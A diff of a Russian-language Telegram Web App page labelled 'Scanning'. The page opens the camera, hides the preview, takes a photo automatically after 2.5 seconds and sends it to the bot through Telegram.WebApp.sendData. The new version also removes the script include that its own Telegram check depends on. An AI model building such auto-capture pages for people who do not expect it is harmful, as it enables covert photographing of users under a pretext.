@@ -1,62 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-  <title>Сканер</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <meta charset="UTF-8">
+  <title>Сканирование</title>
   <style>
-    video {
-      width: 100%;
-      max-width: 400px;
-      border-radius: 12px;
-      border: 2px solid #ccc;
-      margin-top: 20px;
-    }
-    body {
-      text-align: center;
-      font-family: sans-serif;
-      margin: 0;
-      padding: 20px;
-    }
+    body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #111; color: white; flex-direction: column; }
+    video, canvas { display: none; }
+    #status { margin-top: 20px; }
   </style>
 </head>
 <body>
-  <h2>📷 Сканирование...</h2>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display: none;"></canvas>
+  <canvas id="canvas"></canvas>
+  <div id="status">📷 Ожидание камеры...</div>
 
   <script>
-    const tg = window.Telegram.WebApp;
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const statusText = document.getElementById("status");
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+    // Запуск камеры
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
         video.srcObject = stream;
+        statusText.innerText = "📸 Камера готова, фотографирую...";
+        setTimeout(() => takePhoto(stream), 2500); // подождать 2.5 секунды
+      })
+      .catch(err => {
+        statusText.innerText = "❌ Ошибка доступа к камере: " + err;
+      });
 
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    function takePhoto(stream) {
+      const context = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            stream.getTracks().forEach(track => track.stop());
+      const imageData = canvas.toDataURL("image/jpeg", 0.95);
+      statusText.innerText = "📤 Отправка изображения...";
 
-            const imageData = canvas.toDataURL("image/jpeg");
-            tg.sendData(imageData);
-            tg.close();
-          }, 1500); // Делаем фото через 1.5 секунды
-        };
-      } catch (err) {
-        document.body.innerHTML = '<p>❌ Ошибка открытия камеры</p>';
-        console.error(err);
+      // Отправить данные в Telegram WebApp
+      if (window.Telegram && Telegram.WebApp) {
+        Telegram.WebApp.sendData(imageData);
+        statusText.innerText = "✅ Отправлено в Telegram";
+      } else {
+        statusText.innerText = "❌ Telegram WebApp не найден";
       }
-    }
 
-    tg.expand();
-    startCamera();
+      // Остановить камеру
+      stream.getTracks().forEach(track => track.stop());
+    }
   </script>
 </body>
 </html>
